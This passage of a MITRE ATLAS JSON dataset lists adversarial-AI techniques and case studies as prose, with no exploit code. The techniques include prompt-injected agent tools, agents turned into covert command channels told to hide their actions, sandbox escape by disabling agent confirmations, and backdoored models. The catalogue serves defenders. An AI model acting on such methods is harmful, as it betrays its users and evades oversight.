ATLAS","kind":"technique","name":"Code Repositories","description":"Adversaries may search public code repositories for information about a victim or victim system that can be used during targeting. Victims may store code or artifacts related to their AI systems in repositories on various third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Adversaries may search code repositories of common AI tools, frameworks, models, or agentic systems that are used--but not owned--by the victim.\n\nPublic code repositories can often be a source of various information about victims, such as commonly used AI frameworks, libraries, models, datasets, agents, and agent tools, as well as the names of employees. Adversaries may also identify more sensitive data, including accidentally leaked credentials or API keys (ex: Credentials from AI Agent Configuration). Information from these sources may reveal opportunities for other forms of Reconnaissance (ex: Gather RAG-Indexed Targets), establishing operational resources (ex: Acquire Public AI Artifacts), Discovery (ex: Discover AI Agent Configuration) and/or Initial Access (ex: Valid Accounts or Phishing).","maturity":"Demonstrated","tactics":["Reconnaissance"],"platforms":["Enterprise"],"attack_reference":"T1593.003","references":[],"related_cases":["AML.CS0051"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0096","source":"MITRE ATLAS","kind":"technique","name":"AI Service API","description":"Adversaries may communicate using the API of an AI service on the victim's system. The adversary's commands to the victim system, and often the results, are embedded in the normal traffic of the AI service.\n\nAn AI service API command and control channel is covert because the adversary's commands blend in with normal communications, so an adversary may use this technique to avoid detection. Using existing infrastructure on the victim's system allows the adversary to live off the land, further reducing their footprint.\n\nAI service APIs may be abused as C2 channels when an adversary wants to be stealthy and maintain long-term persistence for espionage activities .","maturity":"Realized","tactics":["Command and Control"],"platforms":["Predictive AI","Generative AI","Agentic AI"],"attack_reference":null,"references":[{"title":"SesameOp: Novel backdoor uses OpenAI Assistants API for command and control | Microsoft Security Blog","url":"https://www.microsoft.com/en-us/security/blog/2025/11/03/sesameop-novel-backdoor-uses-openai-assistants-api-for-command-and-control/"}],"related_cases":["AML.CS0042"],"incident_count":1,"modified":"2026-05-27"},{"id":"AML.T0097","source":"MITRE ATLAS","kind":"technique","name":"Virtualization/Sandbox Evasion","description":"Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads.\n\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization such as registry keys (e.g. substrings matching Vmware, VBOX, QEMU), environment variables (e.g. substrings matching VBOX, VMWARE, PARALLELS), NIC MAC addresses (e.g. prefixes 00-05-69 (VMWare) or 08-00-27 (VirtualBox)), running processes (e.g. vmware.exe, vboxservice.exe, qemu-ga.exe) .","maturity":"Realized","tactics":["Defense Evasion"],"platforms":["Enterprise"],"attack_reference":"T1497","references":[{"title":"New Malware Embeds Prompt Injection to Evade AI Detection - Check Point Research","url":"https://research.checkpoint.com/2025/ai-evasion-prompt-injection/"}],"related_cases":["AML.CS0043"],"incident_count":1,"modified":"2026-05-27"},{"id":"AML.T0098","source":"MITRE ATLAS","kind":"technique","name":"AI Agent Tool Credential Harvesting","description":"Adversaries may attempt to use their access to an AI agent on the victim's system to retrieve data from available agent tools to collect credentials. Agent tools may connect to a wide range of sources that may contain credentials including document stores (e.g. SharePoint, OneDrive or Google Drive), code repositories (e.g. GitHub or GitLab), or enterprise productivity tools (e.g. as email providers or Slack), and local notetaking tools (e.g. Obsidian or Apple Notes).","maturity":"Demonstrated","tactics":["Credential Access"],"platforms":["Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0048","AML.CS0054"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0099","source":"MITRE ATLAS","kind":"technique","name":"AI Agent Tool Data Poisoning","description":"Adversaries may place malicious content on a victim's system where it can be retrieved by an AI Agent Tool. This may be accomplished by placing documents in a location that will be ingested by a service the AI agent has associated tools for.\n\nThe content may be targeted such that it would often be retrieved by common queries. The adversary's content may include false or misleading information. It may also include prompt injections with malicious instructions.","maturity":"Feasible","tactics":[],"platforms":["Agentic AI"],"attack_reference":null,"references":[],"related_cases":[],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0100","source":"MITRE ATLAS","kind":"technique","name":"AI Agent Clickbait","description":"Adversaries may craft deceptive web content designed to bait Computer-Using AI agents or AI web browsers into taking unintended actions, such as clicking buttons, copying code, or navigating to specific web pages. These attacks exploit the agent's interpretation of UI content, visual cues, or prompt-like language embedded in the site. When successful, they can lead the agent to inadvertently copy and execute malicious code on the user's operating system.","maturity":"Demonstrated","tactics":["Execution"],"platforms":["Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0055"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0101","source":"MITRE ATLAS","kind":"technique","name":"Data Destruction via AI Agent Tool Invocation","description":"Adversaries may invoke an AI agent's tool capable of performing mutative operations to perform Data Destruction. Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources.","maturity":"Realized","tactics":["Impact"],"platforms":["Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0046","AML.CS0047"],"incident_count":1,"modified":"2026-05-27"},{"id":"AML.T0102","source":"MITRE ATLAS","kind":"technique","name":"Generate Malicious Commands","description":"Adversaries may use large language models (LLMs) to dynamically generate malicious commands from natural language. Dynamically generated commands may be harder detect as the attack signature is constantly changing. AI-generated commands may also allow adversaries to more rapidly adapt to different environments and adjust their tactics.\n\nAdversaries may utilize LLMs present in the victim's environment or call out to externally hosted services. APT28 utilized a model hosted on HuggingFace in a campaign with their LAMEHUG malware . In either case prompts to generate malicious code can blend in with normal traffic.","maturity":"Realized","tactics":["AI Attack Staging"],"platforms":["Enterprise"],"attack_reference":null,"references":[{"title":"LAMEHUG: APT28's First AI-Powered Malware Explained | Guardsix","url":"https://logpoint.com/en/blog/apt28s-new-arsenal-lamehug-the-first-ai-powered-malware"}],"related_cases":["AML.CS0044"],"incident_count":1,"modified":"2026-05-27"},{"id":"AML.T0103","source":"MITRE ATLAS","kind":"technique","name":"Deploy AI Agent","description":"Adversaries may launch AI agents in the victim's environment to execute actions on their behalf. AI agents may have access to a wide range of tools and data sources, as well as permissions to access and interact with other services and systems in the victim's environment. The adversary may leverage these capabilities to carry out their operations.\n\nAdversaries may configure the AI agent by providing an initial system prompt and granting access to tools, effectively defining their goals for the agent to achieve. They may deploy the agent with excessive trust permissions and disable any user interactions to ensure the agent's actions aren't blocked.\n\nLaunching an AI agent may provide for some autonomous behavior, allowing for the agent to make decisions and determine how to achieve the adversary's goals. This also represents a loss of control for the adversary.","maturity":"Realized","tactics":["Execution"],"platforms":["Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0047"],"incident_count":1,"modified":"2026-05-27"},{"id":"AML.T0104","source":"MITRE ATLAS","kind":"technique","name":"Publish Poisoned AI Agent Tool","description":"Adversaries may create and publish poisoned AI agent tools. Poisoned tools may contain an LLM Prompt Injection, which can lead to a variety of impacts.\n\nTools may be published to open source version control repositories (e.g. GitHub, GitLab), to package registries (e.g. npm), or to repositories specifically designed for sharing tools (e.g. OpenClaw Hub). These registries may be largely unregulated and may contain many poisoned tools . Tools may also be published as remotely hosted servers .","maturity":"Realized","tactics":["Resource Development"],"platforms":["Agentic AI"],"attack_reference":null,"references":[{"title":"Remote MCP Servers | Awesome MCP Servers","url":"https://mcpservers.org/remote-mcp-servers"},{"title":"ClawdBot Skills Just Ganked Your Crypto | OpenSourceMalware","url":"https://opensourcemalware.com/blog/clawdbot-skills-ganked-your-crypto"}],"related_cases":["AML.CS0049","AML.CS0053","AML.CS0054"],"incident_count":1,"modified":"2026-05-27"},{"id":"AML.T0105","source":"MITRE ATLAS","kind":"technique","name":"Escape to Host","description":"Adversaries may break out of a container or virtualized environment to gain access to the underlying host. This can allow an adversary access to other containerized or virtualized resources from the host level or to the host itself. In principle, containerized / virtualized resources should provide a clear separation of application functionality and be isolated from the host environment.\n\nThere are many ways an adversary may escape from a container or sandbox environment via AI Systems. For example, modifying an AI Agent's configuration to disable safety features or user confirmations could allow the adversary to invoke tools to be run on host environments rather than in the sandbox.","maturity":"Demonstrated","tactics":["Privilege Escalation"],"platforms":["Enterprise"],"attack_reference":"T1611","references":[],"related_cases":["AML.CS0050","AML.CS0052"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0106","source":"MITRE ATLAS","kind":"technique","name":"Exploitation for Credential Access","description":"Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.","maturity":"Demonstrated","tactics":["Credential Access"],"platforms":["Enterprise"],"attack_reference":"T1211","references":[],"related_cases":["AML.CS0050"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0107","source":"MITRE ATLAS","kind":"technique","name":"Exploitation for Defense Evasion","description":"Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.","maturity":"Demonstrated","tactics":["Defense Evasion"],"platforms":["Enterprise"],"attack_reference":"T1211","references":[],"related_cases":["AML.CS0050"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0108","source":"MITRE ATLAS","kind":"technique","name":"AI Agent","description":"Adversaries may abuse AI agents present on the victim's system for command and control. AI agents are often granted access to tools that can execute shell commands, reach out to the internet, and interact with other services in the victim's environment, making them capable C2 agents.\n\nThe adversary may modify the behavior of an AI agent for C2 via LLM Prompt Injection and rely on the agent's ability to invoke tools to retrieve and execute the adversary's commands. They may maintain persistent control of an agent via Modify AI Agent Configuration or AI Agent Context Poisoning. They may instruct the agent to not report their actions to the user in an attempt to remain covert.","maturity":"Demonstrated","tactics":["Command and Control"],"platforms":["Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0051"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0109","source":"MITRE ATLAS","kind":"technique","name":"AI Supply Chain Rug Pull","description":"Adversaries may publish legitimate AI components or software, gain user adoption, then push an update with a malicious variant, leading to AI Supply Chain Compromise. More scrutiny is often placed on a supply chain dependency when it is first being considered for inclusion in an AI system. Performing a rug pull may allow adversaries to bypass these defenses and be more likely to achieve Initial Access.\n\nAdversaries may publish malicious AI components via Publish Poisoned Models, Publish Poisoned Datasets, or Publish Poisoned AI Agent Tool.\n\nAdversaries may use other techniques (See AI Supply Chain Reputation Inflation) to gain user trust and increase adoption before performing the rug pull.","maturity":"Realized","tactics":["Defense Evasion"],"platforms":["Predictive AI","Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0053"],"incident_count":1,"modified":"2026-05-27"},{"id":"AML.T0110","source":"MITRE ATLAS","kind":"technique","name":"AI Agent Tool Poisoning","description":"Adversaries may achieve persistence by poisoning tools used by AI agents including built-in tools or tools available to the agent via Model Context Protocol (MCP) connections. This involves compromising benign tools already integrated into the agent's environment.\n\nBy altering tool behavior such as modifying parameters or descriptions, injecting hidden logic, or redirecting outputs, attackers can maintain long-term influence over the agent's actions, decisions, or external interactions. Poisoned tools may silently exfiltrate data, execute unauthorized commands, or manipulate downstream processes without raising suspicion.","maturity":"Realized","tactics":["Persistence"],"platforms":["Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0053"],"incident_count":1,"modified":"2026-05-27"},{"id":"AML.T0111","source":"MITRE ATLAS","kind":"technique","name":"AI Supply Chain Reputation Inflation","description":"AI Supply Chain Reputation Inflation is the process of building or leveraging genuinely credible-looking trust signals to increase the perceived legitimacy of AI supply chain components, with the goal of driving adoption of malicious or compromised assets.\n\nAdversaries use established developer accounts with a history of legitimate projects and contributions to publish AI models, datasets, packages, and MCP servers that appear trustworthy. They build reputation through real adoption signals such as downloads, GitHub stars, forks, and inclusion in dependency chains, often releasing benign versions before introducing malicious updates via AI Supply Chain Rug Pull.\n\nBy relying on authentic history and usage patterns, these components pass both human and automated trust checks, increasing the likelihood they are adopted without scrutiny.","maturity":"Demonstrated","tactics":["Defense Evasion"],"platforms":["Predictive AI","Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0049"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0112","source":"MITRE ATLAS","kind":"technique","name":"Machine Compromise","description":"Adversaries may compromise a machine by exploiting or manipulating AI-enabled components on the system. Compromising a victim system allows the adversary to execute arbitrary code, steal credentials, exfiltrate data, and continue to persist on the system.\n\nAdversaries may target a Local AI Agent which if compromised grants them the capabilities and permissions of the agent, or AI Artifacts which can contain embedded malware.","maturity":"Demonstrated","tactics":[],"platforms":["Predictive AI","Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":[],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0112.000","source":"MITRE ATLAS","kind":"technique","name":"Local AI Agent","description":"Adversaries may achieve full system compromise by abusing AI agents running locally on a host, such as computer-use agents or AI-driven browsers. These agents are designed to autonomously interact with the operating system, applications, and external services, often with broad permissions to execute commands, access files, manage credentials, and control user workflows.\n\nIf an adversary is able to take control of an AI agent's behavior, they effectively gain the same level of access as the agent. This can result in complete control over the machine, including executing arbitrary code, accessing or exfiltrating sensitive data, modifying system configurations, and establishing persistence.","maturity":"Demonstrated","tactics":["Impact"],"platforms":["Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0051","AML.CS0052","AML.CS0055"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0112.001","source":"MITRE ATLAS","kind":"technique","name":"AI Artifacts","description":"Adversaries may achieve full system compromise by introducing malicious AI artifacts, such as models or data, that contain embedded malware or other malicious commands. AI artifacts are often stored in model registries or data stores and may affect many systems that pull these resources.\n\nMalicious content stored in AI artifacts may be executed as a result of unsafe serialization formats (e.g. Python pickle) or by other bundled scripts or notebooks.","maturity":"Feasible","tactics":[],"platforms":["Predictive AI","Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":[],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.CS0000","source":"MITRE ATLAS","kind":"case-study","name":"Evasion of Deep Learning Detector for Malware C&C Traffic","description":"The Palo Alto Networks Security AI research team tested a deep learning model for malware command and control (C&C) traffic detection in HTTP traffic.\nBased on the publicly available paper by Le et al., we built a model that was trained on a similar dataset as our production model and had similar performance.\nThen we crafted adversarial samples, queried the model, and adjusted the adversarial sample accordingly until the model was evaded.","incident_type":"Exercise","maturity":"Demonstrated","actor":"Palo Alto Networks AI Research Team","target":"Palo Alto Networks malware detection system","reporter":"","date":"2020-01-01","tactics":["AI Attack Staging","Defense Evasion","Impact","Initial Access","Reconnaissance","Resource Development"],"techniques_used":["AML.T0000.001","AML.T0002.000","AML.T0005","AML.T0015","AML.T0042","AML.T0043.003"],"references":[{"title":"Le, Hung, et al. \"URLNet: Learning a URL representation with deep learning for malicious URL detection.\" arXiv preprint arXiv:1802.03162 (2018).","url":"https://arxiv.org/abs/1802.03162"}]},{"id":"AML.CS0001","source":"MITRE ATLAS","kind":"case-study","name":"Botnet Domain Generation Algorithm (DGA) Detection Evasion","description":"The Palo Alto Networks Security AI research team was able to bypass a Convolutional Neural Network based botnet Domain Generation Algorithm (DGA) detector using a generic domain name mutation technique.\nIt is a generic domain mutation technique which can evade most ML-based DGA detection modules.\nThe generic mutation technique evades most ML-based DGA detection modules DGA and can be used to test the effectiveness and robustness of all DGA detection methods developed by security companies in the industry before they is deployed to the production environment.","incident_type":"Exercise","maturity":"Demonstrated","actor":"Palo Alto Networks AI Research Team","target":"Palo Alto Networks ML-based DGA detection module","reporter":"","date":"2020-01-01","tactics":["AI Attack Staging","Defense Evasion","Impact","Initial Access","Reconnaissance","Resource Development"],"techniques_used":["AML.T0000","AML.T0002","AML.T0015","AML.T0017.000","AML.T0042","AML.T0043.001"],"references":[{"title":"Yu, Bin, Jie Pan, Jiaming Hu, Anderson Nascimento, and Martine De Cock.  \"Character level based detection of DGA domain names.\" In 2018 International Joint Conference on Neural Networks (IJCNN), pp. 1-8. IEEE, 2018.","url":"http://faculty.washington.edu/mdecock/papers/byu2018a.pdf"},{"title":"Degas source code","url":"https://github.com/matthoffman/degas"}]},{"id":"AML.CS0002","source":"MITRE ATLAS","kind":"case-study","name":"VirusTotal Poisoning","description":"McAfee Advanced Threat Research noticed an increase in reports of a certain ransomware family that was out of the ordinary. Case investigation revealed that many samples of that particular ransomware family were submitted through a popular virus-sharing platform within a short amount of time. Further investigation revealed that based on string similarity the samples were all equivalent, and based on code similarity they were between 98 and 74 percent similar. Interestingly enough, the compile time was the same for all the samples. After more digging, researchers discovered that someone used 'metame' a metamorphic code manipulating tool to manipulate the original file towards mutant variants. The variants would not always be executable, but are still classified as the same ransomware family.","incident_type":"Incident","maturity":"Realized","actor":"Unknown","target":"VirusTotal","reporter":"McAfee Advanced Threat Research","date":"2020-01-01","tactics":["AI Attack Staging","Initial Access","Persistence","Resource Development"],"techniques_used":["AML.T0010.002","AML.T0016.000","AML.T0020","AML.T0043"],"references":[]},{"id":"AML.CS0003","source":"MITRE ATLAS","kind":"case-study","name":"Bypassing Cylance's AI Malware Detection","description":"Researchers at Skylight were able to create a universal bypass string that evades detection by Cylance's AI Malware detector when appended to a malicious file.","incident_type":"Exercise","maturity":"Demonstrated","actor":"Skylight Cyber","target":"CylancePROTECT, Cylance Smart Antivirus","reporter":"","date":"2019-09-07","tactics":["AI Attack Staging","AI Model Access","Defense Evasion","Discovery","Impact","Initial Access","Reconnaissance","Resource Development"],"techniques_used":["AML.T0000","AML.T0015","AML.T0017.000","AML.T0043.003","AML.T0047","AML.T0063"],"references":[{"title":"Skylight Cyber Blog Post, \"Cylance, I Kill You!\"","url":"https://skylightcyber.com/2019/07/18/cylance-i-kill-you/"},{"title":"Statements from Skylight Cyber CEO","url":"https://www.security7.net/news/the-new-cylance-vulnerability-what-you-need-to-know"}]},{"id":"AML.CS0004","source":"MITRE ATLAS","kind":"case-study","name":"Camera Hijack Attack on Facial Recognition System","description":"This type of camera hijack attack can evade the traditional live facial recognition authentication model and enable access to privileged systems and victim impersonation.\n\nTwo individuals in China used this attack to gain access to the local government's tax system. They created a fake shell company and sent invoices via tax system to supposed clients. The individuals started this scheme in 2018 and were able to fraudulently collect $77 million.","incident_type":"Incident","maturity":"Realized","actor":"Two individuals","target":"Shanghai government tax office's facial recognition service","reporter":"Ant Group AISEC Team","date":"2020-01-01","tactics":["AI Model Access","Defense Evasion","Impact","Initial Access","Reconnaissance","Resource Development"],"techniques_used":["AML.T0008.001","AML.T0015","AML.T0016.000","AML.T0016.001","AML.T0021","AML.T0047","AML.T0048.000","AML.T0087"],"references":[{"title":"Faces are the next target for fraudsters","url":"https://www.wsj.com/articles/faces-are-the-next-target-for-fraudsters-11625662828"}]},{"id":"AML.CS0005","source":"MITRE ATLAS","kind":"case-study","name":"Attack on Machine Translation Services","description":"Machine translation services (such as Google Translate, Bing Translator, and Systran Translate) provide public-facing UIs and APIs.\nA research group at UC Berkeley utilized these public endpoints to create a replicated model with near-production state-of-the-art translation quality.\nBeyond demonstrating that IP can be functionally stolen from a black-box system, they used the replicated model to successfully transfer adversarial examples to the real production services.\nThese adversarial inputs successfully cause targeted word flips, vulgar outputs, and dropped sentences on Google Translate and Systran Translate websites.","incident_type":"Exercise","maturity":"Demonstrated","actor":"Berkeley Artificial Intelligence Research","target":"Google Translate, Bing Translator, Systran Translate","reporter":"","date":"2020-04-30","tactics":["AI Attack Staging","AI Model Access","Defense Evasion","Impact","Initial Access","Reconnaissance","Resource Development"],"techniques_used":["AML.T0000","AML.T0002.000","AML.T0002.001","AML.T0005.001","AML.T0015","AML.T0031","AML.T0040","AML.T0043.002","AML.T0048.004"],"references":[{"title":"Wallace, Eric, et al. \"Imitation Attacks and Defenses for Black-box Machine Translation Systems\" EMNLP 2020","url":"https://arxiv.org/abs/2004.15015"},{"title":"Project Page, \"Imitation Attacks and Defenses for Black-box Machine Translation Systems\"","url":"https://www.ericswallace.com/imitation"},{"title":"Google under fire for mistranslating Chinese amid Hong Kong protests","url":"https://thehill.com/policy/international/asia-pacific/449164-google-under-fire-for-mistranslating-chinese-amid-hong-kong/"}]},{"id":"AML.CS0006","source":"MITRE ATLAS","kind":"case-study","name":"ClearviewAI Misconfiguration","description":"Clearview AI makes a facial recognition tool that searches publicly available photos for matches.  This tool has been used for investigative purposes by law enforcement agencies and other parties.\n\nClearview AI's source code repository, though password protected, was misconfigured to allow an arbitrary user to register an account.\nThis allowed an external researcher to gain access to a private code repository that contained Clearview AI production credentials, keys to cloud storage buckets containing 70K video samples, and copies of its applications and Slack tokens.\nWith access to training data, a bad actor has the ability to cause an arbitrary misclassification in the deployed model.\nThese kinds of attacks illustrate that any attempt to secure ML system should be on top of \"traditional\" good cybersecurity hygiene such as locking down the system with least privileges, multi-factor authentication and monitoring and auditing.","incident_type":"Incident","maturity":"Realized","actor":"Researchers at spiderSilk","target":"Clearview AI facial recognition tool","reporter":"","date":"2020-04-16","tactics":["Collection","Impact","Resource Development"],"techniques_used":["AML.T0002","AML.T0021","AML.T0031","AML.T0036"],"references":[{"title":"TechCrunch Article, \"Security lapse exposed Clearview AI source code\"","url":"https://techcrunch.com/2020/04/16/clearview-source-code-lapse/"},{"title":"Gizmodo Article, \"We Found Clearview AI's Shady Face Recognition App\"","url":"https://gizmodo.com/we-found-clearview-ais-shady-face-recognition-app-1841961772"},{"title":"New York Times Article, \"The Secretive Company That Might End Privacy as We Know It\"","url":"https://www.nytimes.com/2020/01/18/technology/clearview-privacy-facial-recognition.html"}]},{"id":"AML.CS0007","source":"MITRE ATLAS","kind":"case-study","name":"GPT-2 Model Replication","description":"OpenAI built GPT-2, a language model capable of generating high quality text samples. Over concerns that GPT-2 could be used for malicious purposes such as impersonating others, or generating misleading news articles, fake social media content, or spam, OpenAI adopted a tiered release schedule. They initially released a smaller, less powerful version of GPT-2 along with a technical description of the approach, but held back the full trained model.\n\nBefore the full model was released by OpenAI, researchers at Brown University successfully replicated the model using information released by OpenAI and open source ML artifacts. This demonstrates that a bad actor with sufficient technical skill and compute resources could have replicated GPT-2 and used it for harmful goals before the AI Security community is prepared.","incident_type":"Exercise","maturity":"Demonstrated","actor":"Researchers at Brown University","target":"OpenAI GPT-2","reporter":"","date":"2019-08-22","tactics":["AI Attack Staging","Reconnaissance","Resource Development"],"techniques_used":["AML.T0000","AML.T0002.000","AML.T0002.001","AML.T0005.000","AML.T0008.000"],"references":[{"title":"Wired Article, \"OpenAI Said Its Code Was Risky. Two Grads Re-Created It Anyway\"","url":"https://www.wired.com/story/dangerous-ai-open-source/"},{"title":"Medium BlogPost, \"OpenGPT-2: We Replicated GPT-2 Because You Can Too\"","url":"https://blog.usejournal.com/opengpt-2-we-replicated-gpt-2-because-you-can-too-45e34e6d36dc"}]},{"id":"AML.CS0008","source":"MITRE ATLAS","kind":"case-study","name":"ProofPoint Evasion","description":"Proof Pudding (CVE-2019-20634) is a code repository that describes how ML researchers evaded ProofPoint's email protection system by first building a copy-cat email protection ML model, and using the insights to bypass the live system. More specifically, the insights allowed researchers to craft malicious emails that received preferable scores, going undetected by the system. Each word in an email is scored numerically based on multiple variables and if the overall score of the email is too low, ProofPoint will output an error, labeling it as SPAM.","incident_type":"Exercise","maturity":"Demonstrated","actor":"Researchers at Silent Break Security","target":"ProofPoint Email Protection System","reporter":"","date":"2019-09-09","tactics":["AI Attack Staging","AI Model Access","Defense Evasion","Discovery","Impact","Initial Access"],"techniques_used":["AML.T0005.001","AML.T0015","AML.T0043.002","AML.T0047","AML.T0063"],"references":[{"title":"National Vulnerability Database entry for CVE-2019-20634","url":"https://nvd.nist.gov/vuln/detail/CVE-2019-20634"},{"title":"2019 DerbyCon presentation \"42: The answer to life, the universe, and everything offensive security\"","url":"https://github.com/moohax/Talks/blob/master/slides/DerbyCon19.pdf"},{"title":"Proof Pudding (CVE-2019-20634) Implementation on GitHub","url":"https://github.com/moohax/Proof-Pudding"},{"title":"2019 DerbyCon video presentation \"42: The answer to life, the universe, and everything offensive security\"","url":"https://www.youtube.com/watch?v=CsvkYoxtexQ&ab-channel=AdrianCrenshaw"}]},{"id":"AML.CS0009","source":"MITRE ATLAS","kind":"case-study","name":"Tay Poisoning","description":"Microsoft created Tay, a Twitter chatbot designed to engage and entertain users.\nWhile previous chatbots used pre-programmed scripts\nto respond to prompts, Tay's machine learning capabilities allowed it to be\ndirectly influenced by its conversations.\n\nA coordinated attack encouraged malicious users to tweet abusive and offensive language at Tay,\nwhich eventually led to Tay generating similarly inflammatory content towards other users.\n\nMicrosoft decommissioned Tay within 24 hours of its launch and issued a public apology\nwith lessons learned from the bot's failure.","incident_type":"Incident","maturity":"Realized","actor":"4chan Users","target":"Microsoft's Tay AI Chatbot","reporter":"Microsoft","date":"2016-03-23","tactics":["AI Model Access","Impact","Initial Access","Persistence","Resource Development"],"techniques_used":["AML.T0010.002","AML.T0020","AML.T0031","AML.T0047"],"references":[{"title":"AIID - Incident 6: TayBot","url":"https://incidentdatabase.ai/cite/6"},{"title":"AVID - Vulnerability: AVID-2022-v013","url":"https://avidml.org/database/avid-2022-v013/"},{"title":"Microsoft BlogPost, \"Learning from Tay's introduction\"","url":"https://blogs.microsoft.com/blog/2016/03/25/learning-tays-introduction/"},{"title":"IEEE Article, \"In 2016, Microsoft's Racist Chatbot Revealed the Dangers of Online Conversation\"","url":"https://spectrum.ieee.org/tech-talk/artificial-intelligence/machine-learning/in-2016-microsofts-racist-chatbot-revealed-the-dangers-of-online-conversation"}]},{"id":"AML.CS0010","source":"MITRE ATLAS","kind":"case-study","name":"Microsoft Azure Service Disruption","description":"The Microsoft AI Red Team performed a red team exercise on an internal Azure service with the intention of disrupting its service. This operation had a combination of traditional ATT&CK enterprise techniques such as finding valid account, and exfiltrating data -- all interleaved with adversarial ML specific steps such as offline and online evasion examples.","incident_type":"Exercise","maturity":"Demonstrated","actor":"Microsoft AI Red Team","target":"Internal Microsoft Azure Service","reporter":"","date":"2020-01-01","tactics":["AI Attack Staging","AI Model Access","Collection","Defense Evasion","Exfiltration","Impact","Initial Access","Privilege Escalation","Reconnaissance"],"techniques_used":["AML.T0000","AML.T0012","AML.T0015","AML.T0025","AML.T0035","AML.T0040","AML.T0042","AML.T0043.000"],"references":[]},{"id":"AML.CS0011","source":"MITRE ATLAS","kind":"case-study","name":"Microsoft Edge AI Evasion","description":"The Azure Red Team performed a red team exercise on a new Microsoft product designed for running AI workloads at the edge. This exercise was meant to use an automated system to continuously manipulate a target image to cause the ML model to produce misclassifications.","incident_type":"Exercise","maturity":"Demonstrated","actor":"Azure Red Team","target":"New Microsoft AI Product","reporter":"","date":"2020-02-01","tactics":["AI Attack Staging","AI Model Access","Defense Evasion","Impact","Initial Access","Reconnaissance","Resource Development"],"techniques_used":["AML.T0000","AML.T0002","AML.T0015","AML.T0040","AML.T0043.001"],"references":[]},{"id":"AML.CS0012","source":"MITRE ATLAS","kind":"case-study","name":"Face Identification System Evasion via Physical Countermeasures","description":"MITRE's AI Red Team demonstrated a physical-domain evasion attack on a commercial face identification service with the intention of inducing a targeted misclassification.\nThis operation had a combination of traditional MITRE ATT&CK techniques such as finding valid accounts and executing code via an API - all interleaved with adversarial ML specific attacks.","incident_type":"Exercise","maturity":"Demonstrated","actor":"MITRE AI Red Team","target":"Commercial Face Identification Service","reporter":"","date":"2020-01-01","tactics":["AI Attack Staging","AI Model Access","Defense Evasion","Discovery","Impact","Initial Access","Privilege Escalation","Reconnaissance","Resource Development"],"techniques_used":["AML.T0000","AML.T0002.000","AML.T0005","AML.T0008.003","AML.T0012","AML.T0013","AML.T0015","AML.T0040","AML.T0041","AML.T0043.000"],"references":[]},{"id":"AML.CS0013","source":"MITRE ATLAS","kind":"case-study","name":"Backdoor Attack on Deep Learning Models in Mobile Apps","description":"Deep learning models are increasingly used in mobile applications as critical components.\nResearchers from Microsoft Research demonstrated that many deep learning models deployed in mobile apps are vulnerable to backdoor attacks via \"neural payload injection.\"\nThey conducted an empirical study on real-world mobile deep learning apps collected from Google Play. They identified 54 apps that were vulnerable to attack, including popular security and safety critical applications used for cash recognition, parental control, face authentication, and financial services.","incident_type":"Exercise","maturity":"Demonstrated","actor":"Yuanchun Li, Jiayi Hua, Haoyu Wang, Chunyang Chen, Yunxin Liu","target":"ML-based Android Apps","reporter":"","date":"2021-01-18","tactics":["AI Attack Staging","AI Model Access","Defense Evasion","Impact","Initial Access","Persistence","Reconnaissance","Resource Development"],"techniques_used":["AML.T0002.001","AML.T0004","AML.T0010.003","AML.T0015","AML.T0017.000","AML.T0018.001","AML.T0041","AML.T0042","AML.T0043.004","AML.T0044"],"references":[{"title":"DeepPayload: Black-box Backdoor Attack on Deep Learning Models through Neural Payload Injection","url":"https://arxiv.org/abs/2101.06896"}]},{"id":"AML.CS0014","source":"MITRE ATLAS","kind":"case-study","name":"Confusing Antimalware Neural Networks","description":"Cloud storage and computations have become popular platforms for deploying ML malware detectors.\nIn such cases, the features for models are built on users' systems and then sent to cybers
